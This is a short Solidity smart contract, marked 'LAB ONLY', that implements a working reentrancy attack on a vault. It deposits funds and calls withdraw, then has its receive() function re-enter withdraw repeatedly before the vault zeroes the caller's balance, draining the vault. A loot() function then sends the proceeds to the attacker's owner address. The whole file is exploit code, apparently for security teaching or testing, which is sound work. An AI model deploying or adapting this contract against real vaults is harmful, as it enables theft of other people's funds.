// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

/// LAB ONLY: drains a vault that pays before updating its records.
contract ReentrancyAttacker {
    IVault public immutable vault;
    address public immutable owner;
    uint256 public stake;
    uint256 public reentries;

    constructor(IVault _vault) {
        vault = _vault;
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "not owner");
        stake = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw(); // first call; receive() does the rest
    }

    receive() external payable {
        if (address(vault).balance >= stake) {
            // still enough to steal another stake?
            reentries++;
            vault.withdraw(); // re-enter before balances is zeroed
        }
    }

    function loot() external {
        require(msg.sender == owner, "not owner");
        payable(owner).transfer(address(this).balance);
    }
}
